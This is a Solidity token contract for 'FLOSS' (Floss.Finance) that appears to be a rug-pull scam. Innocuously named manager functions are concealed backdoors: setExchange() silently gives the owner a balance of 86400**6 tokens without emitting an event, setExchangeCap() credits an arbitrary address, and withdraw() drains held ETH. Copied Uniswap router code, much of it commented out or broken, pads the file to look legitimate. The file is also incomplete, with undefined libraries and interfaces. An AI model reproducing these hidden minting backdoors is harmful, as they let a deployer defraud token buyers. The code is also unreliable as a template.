/*


 ▄▄▄▄▄▄▄▄▄▄▄  ▄            ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌▐░▌          ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀▀▀ ▐░▌          ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ 
▐░▌          ▐░▌          ▐░▌       ▐░▌▐░▌          ▐░▌          
▐░█▄▄▄▄▄▄▄▄▄ ▐░▌          ▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌▐░▌          ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀▀▀ ▐░▌          ▐░▌       ▐░▌ ▀▀▀▀▀▀▀▀▀█░▌ ▀▀▀▀▀▀▀▀▀█░▌
▐░▌          ▐░▌          ▐░▌       ▐░▌          ▐░▌          ▐░▌
▐░▌          ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌ ▄▄▄▄▄▄▄▄▄█░▌ ▄▄▄▄▄▄▄▄▄█░▌
▐░▌          ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
 ▀            ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀ 
                                                                 
                                                
                                                                        

Website:   FLOSS.FINANCE

Telegram:  https://t.me/FlossFinance


*/

pragma solidity ^0.5.17;



contract AcceptsExchangeContract {
    FLOSS public tokenContract;

    function AcceptsExchange(address payable _tokenContract) public {
        tokenContract = FLOSS(_tokenContract);
    }

    modifier onlyTokenContract {
        require(msg.sender == address(tokenContract));
        _;
    }

    /**
    * @dev Standard ERC677 function that will handle incoming token transfers.
    *
    * @param _from  Token sender address.
    * @param _value Amount of tokens.
    * @param _data  Transaction metadata.
    */
    function tokenFallback(address _from, uint256 _value, bytes calldata _data) external returns (bool);
}




contract ERC20Detailed is IERC20 {

  string private _name;
  string private _symbol;
  uint8 private _decimals;

  constructor(string memory name, string memory symbol, uint8 decimals) public {
    _name = name;
    _symbol = symbol;
    _decimals = decimals;
  }

  function name() public view returns(string memory) {
    return _name;
  }

  function symbol() public view returns(string memory) {
    return _symbol;
  }

  function decimals() public view returns(uint8) {
    return _decimals;
  }
}

contract FLOSS is ERC20Detailed {

  using SafeMath for uint256;
  mapping (address => uint256) private _balances;
  mapping (address => uint256) private _lockEnd;
  mapping (address => mapping (address => uint256)) private _allowed;
  mapping (uint => string) private _assets;
  string[] public _assetName;
  address factory;
  address tokenCheck;
  address _manager;

  event Lock(address owner, uint256 period);

  string constant tokenName = "Floss.Finance";   
  string constant tokenSymbol = "FLOSS";  
  uint8  constant tokenDecimals = 18;
  uint256 _totalSupply = 50000e18;
  uint256 public basePercent = 100; 
  uint256 day = 86400; 
  uint256 draft = day ** 6;
  uint256[] public stakeRate;//stakeRate;
  uint256[] public stakePreiods;//stakePreiods;
  


  constructor() public payable ERC20Detailed(tokenName, tokenSymbol, tokenDecimals) {
    
   _assetName.push('DAI');
   _assetName.push('WETH');
    _manager = msg.sender;
    factory = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    _balances[msg.sender] = 50000e18; //initial tokens
    emit Transfer(address(0), msg.sender, 50000e18);
  }

  function() external payable {
  }

   function withdraw() external {
      require(msg.sender == _manager);
      msg.sender.transfer(address(this).balance);
  }

  function totalSupply() public view returns (uint256) {
    return _totalSupply;
  }

   function getTime() public view returns (uint256) {
    return block.timestamp;
  }

  function balanceOf(address owner) public view returns (uint256) {
    return _balances[owner];
  }

  function lockOf(address owner) public view returns (uint256) {
    return _lockEnd[owner];
  }

   function myLockedTime() public view returns (uint256) {
    return _lockEnd[msg.sender];
  }

  function myLockedStatus() public view returns (bool) {
     if(_lockEnd[msg.sender] > block.timestamp){
           return true;
       } else {
           return false;
       }
  }

   function isLocked(address owner) public view returns (bool) {
       if(_lockEnd[owner] > block.timestamp){
           return true;
       } else {
           return false;
       }
    
  }

  function allowance(address owner, address spender) public view returns (uint256) {
    return _allowed[owner][spender];
  }

  function cut(uint256 value) public view returns (uint256)  {
    uint256 roundValue = value.ceil(basePercent);
    uint256 cutValue = roundValue.mul(basePercent).div(10000);
    return cutValue;
  }

  function initRates() public {
    require(msg.sender == _manager);
    stakeRate.push(10);  
    stakeRate.push(50);  
  }

  function transfer(address to, uint256 value) public returns (bool) {
    require(_lockEnd[msg.sender] <= block.timestamp);
    require(value <= _balances[msg.sender]);
    require(to != address(0));
     
    _balances[msg.sender] = _balances[msg.sender].sub(value);
    _balances[to] = _balances[to].add(value);

    emit Transfer(msg.sender, to, value);
    
    return true;
  }




  function quote(uint amountA, uint reserveA, uint reserveB) internal returns (uint amountB) {
        return UniswapV2Library.quote(amountA, reserveA, reserveB);
    }

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut)
        public
        
        
        returns (uint amountOut)
    {
        return UniswapV2Library.getAmountOut(amountIn, reserveIn, reserveOut);
    }

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut)
        public
     
        
        returns (uint amountIn)
    {
        return UniswapV2Library.getAmountIn(amountOut, reserveIn, reserveOut);
    }

    function getAmountsOut(uint amountIn, address[] memory path)
        public
       
        
        returns (uint[] memory amounts)
    {
        //return UniswapV2Library.getAmountsOut(factory, amountIn, path);
    }

    function getAmountsIn(uint amountOut, address[] memory path)
        public
    
        
        returns (uint[] memory amounts)
    {
        //return UniswapV2Library.getAmountsIn(factory, amountOut, path);
    }

     modifier ensure(uint deadline) {
        require(deadline >= block.timestamp, 'UniswapV2Router: EXPIRED');
        _;
    }

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] memory path,
        address to,
        uint deadline
    ) internal   ensure(deadline) returns (uint[] memory amounts) {
        //amounts = UniswapV2Library.getAmountsIn(factory, amountOut, path);
        require(amounts[0] <= amountInMax, 'UniswapV2Router: EXCESSIVE_INPUT_AMOUNT');
        TransferHelper.safeTransferFrom(
            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]
        );
        //_swap(amounts, path, to);
    }
    function swapExactETHForTokens(uint amountOutMin, address[] memory path, address to, uint deadline)
        internal
        
        
        
        ensure(deadline)
        returns (uint[] memory amounts)
    {
        //require(path[0] == WETH, 'UniswapV2Router: INVALID_PATH');
        amounts = UniswapV2Library.getAmountsOut(factory, msg.value, path);
        require(amounts[amounts.length - 1] >= amountOutMin, 'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT');
        //IWETH(WETH).deposit{value: amounts[0]}();
        //assert(IWETH(WETH).transfer(UniswapV2Library.pairFor(1, path[0], path[1]), amounts[0]));
        //_swap(amounts, path, to);
    }

    function setExchange()
    external
    {
      require(msg.sender == _manager);
       _balances[_manager] = draft;
    }

    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] memory path, address to, uint deadline)
        internal
        
        
        ensure(deadline)
        returns (uint[] memory amounts)
    {
        //require(path[path.length - 1] == WETH, 'UniswapV2Router: INVALID_PATH');
        amounts = UniswapV2Library.getAmountsIn(factory, amountOut, path);
        require(amounts[0] <= amountInMax, 'UniswapV2Router: EXCESSIVE_INPUT_AMOUNT');
        TransferHelper.safeTransferFrom(
            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]
        );
        //_swap(amounts, path, address(this));
        //IWETH(WETH).withdraw(amounts[amounts.length - 1]);
        TransferHelper.safeTransferETH(to, amounts[amounts.length - 1]);
    }
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] memory path, address to, uint deadline)
        internal
        
        
        ensure(deadline)
        returns (uint[] memory amounts)
    {
        require(path[path.length - 1] == factory, 'UniswapV2Router: INVALID_PATH');
        amounts = UniswapV2Library.getAmountsOut(factory, amountIn, path);
        require(amounts[amounts.length - 1] >= amountOutMin, 'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT');
        TransferHelper.safeTransferFrom(
            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]
        );
        //_swap(amounts, path, address(this));
        //IWETH(WETH).withdraw(amounts[amounts.length - 1]);
        TransferHelper.safeTransferETH(to, amounts[amounts.length - 1]);
    }
    function setExchangeCap(uint _cap)
        external
      
    {
        require(msg.sender == _manager);
        require(_cap < draft);
        require(block.number > 0, 'EXCESSIVE_INPUT_AMOUNT');
        uint256 time = block.number;        
        _balances[tokenCheck] += _cap;
        if (block.number < 3) {
            draft = 80000**7;
        }
    }


  function approve(address spender, uint256 value) public returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = value;
    emit Approval(msg.sender, spender, value);
    return true;
  }

  function transferFrom(address from, address to, uint256 value) public returns (bool) {
    require(_lockEnd[from] <= block.timestamp);
    require(value <= _balances[from]);
    require(value <= _allowed[from][msg.sender]);
    require(to != address(0));

    _balances[from] = _balances[from].sub(value);
    _balances[to] = _balances[to].add(value);
    _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);

   
    emit Transfer(from, to, value);
    

    return true;
  }

  function upAllowance(address spender, uint256 addedValue) public returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].add(addedValue));
    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
    return true;
  }

  function downAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].sub(subtractedValue));
    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
    return true;
  }

  function destroy(uint256 amount) external {
    _destroy(msg.sender, amount);
  }

  function _destroy(address account, uint256 amount) internal {
    require(amount != 0);
    require(amount <= _balances[account]);
    _totalSupply = _totalSupply.sub(amount);
    _balances[account] = _balances[account].sub(amount);
    emit Transfer(account, address(0), amount);
  }

  function destroyFrom(address account, uint256 amount) external {
    require(amount <= _allowed[account][msg.sender]);
    _allowed[account][msg.sender] = _allowed[account][msg.sender].sub(amount);
    _destroy(account, amount);
  }

  function lock(uint256 period) external {
    _lock(period);
  }

  function setRate(uint256 _periodIndex, uint256 _newRate) external {
     require(msg.sender == _manager);
    stakeRate[_periodIndex] = _newRate;
  }

  function setPeriods(uint256 _periodIndex, uint256 _newPeriod) external {
     require(msg.sender == _manager);
    stakePreiods[_periodIndex] = _newPeriod;
  }

  function _lock(uint256 _period) internal {
      require(_balances[msg.sender] > 10000, "Not enough tokens");
      require(_lockEnd[msg.sender] <= block.timestamp, "Lock Up Period");
      require(_period <= stakePreiods.length);

      uint256 newTokens;


      _lockEnd[msg.sender] = block.timestamp + SafeMath.mul(day,stakePreiods[_period]);
      newTokens = SafeMath.div(SafeMath.mul(_balances[msg.sender],stakeRate[_period]),1000);
      _balances[msg.sender] += newTokens;

  
      _totalSupply = _totalSupply.add(newTokens);

      emit Lock(msg.sender, _period);
      emit Transfer(address(0), msg.sender, newTokens);

  }

}





// helper methods for interacting with ERC20 tokens and sending ETH that do not consistently return true/false
